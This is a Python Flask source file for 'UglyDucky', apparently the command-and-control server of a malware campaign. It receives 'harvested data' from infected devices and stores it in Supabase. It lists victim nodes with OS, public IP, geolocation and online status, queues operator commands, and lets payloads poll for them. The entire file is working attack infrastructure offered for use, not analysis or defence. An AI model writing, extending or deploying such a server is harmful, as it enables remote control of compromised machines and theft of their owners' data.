# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
# Enable CORS so the frontend can communicate with this API
CORS(app)

# Pull Supabase credentials securely from Render Environment Variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

command_queue = {}

# ---------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------
def get_node_status(last_seen_str):
    if not last_seen_str: 
        return "red", "Offline"
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    
    if now - last_seen < timedelta(minutes=2): 
        return "green", "Online"
    if now - last_seen < timedelta(hours=1): 
        return "yellow", "Idle"
    return "red", "Offline"

def geolocate_ip(ip):
    if not ip or ip in ["127.0.0.1", "Unknown"]: 
        return 37.77, -122.41
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
        if response.ok:
            data = response.json()
            return data.get("latitude", 37.77), data.get("longitude", -122.41)
    except:
        pass
    return 37.77, -122.41

# ---------------------------------------------------------
# DASHBOARD ENDPOINTS (Proxy to Supabase)
# ---------------------------------------------------------
@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    """Fetches summary data (IP, OS, Last Seen, Location) for ONE node."""
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    
    try:
        # 1. Get the most recent timestamp for this specific device
        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
        response = requests.get(time_url, headers=headers)
        response.raise_for_status()
        device_data = response.json()

        if not device_data:
            return jsonify({"error": "Node not found"}), 404

        last_seen = device_data[0]['created_at']

        # 2. Get the "System Info" log for this device to parse OS and IP
        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
        sysinfo_resp = requests.get(sysinfo_url, headers=headers)
        
        os_info, ip_info = "Unknown OS", "Unknown IP"
        if sysinfo_resp.ok and sysinfo_resp.json():
            content = sysinfo_resp.json()[0]['content']
            os_match = next((line for line in content.split('\n') if 'Caption' in line), None)
            ip_match = next((line for line in content.split('\n') if 'PUBLIC IP' in line), None)
            if os_match: os_info = os_match.split('=')[-1].strip()
            if ip_match: ip_info = ip_match.split(':')[-1].strip()

        # 3. Get status and physical location
        status_color, _ = get_node_status(last_seen)
        lat, lng = geolocate_ip(ip_info)
        
        node_details = {
            "id": device_id,
            "os": os_info,
            "ip": ip_info,
            "lat": lat,
            "lng": lng,
            "status": status_color,
            "last_seen": last_seen
        }
        
        return jsonify(node_details)

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Failed to fetch from Supabase: {e}"}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    """Fetches all harvested data logs for ONE node."""
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database fetch failed"}), 500

# ---------------------------------------------------------
# PAYLOAD ENDPOINTS
# ---------------------------------------------------------
@app.route('/logs', methods=['POST'])
def push_logs():
    """Payload posts new harvested data here."""
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {
        "apikey": SUPABASE_KEY, 
        "Authorization": f"Bearer {SUPABASE_KEY}", 
        "Prefer": "return=minimal,resolution=merge-duplicates"
    }
    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
    try:
        response = requests.post(upsert_url, json=request.json, headers=headers, timeout=15)
        response.raise_for_status()
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database push failed"}), 500

@app.route('/issue', methods=['POST'])
def issue_command():
    """Dashboard posts a C2 command here."""
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    if not device_id or not command: 
        return jsonify({"error": "device_id and command are required"}), 400
    command_queue[device_id] = command
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    """Payload continuously asks this endpoint for commands."""
    command = command_queue.pop(device_id, None)
    return jsonify({"command": command})

@app.route('/')
def index(): 
    return "UglyDucky C2 Hub & Proxy Online."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
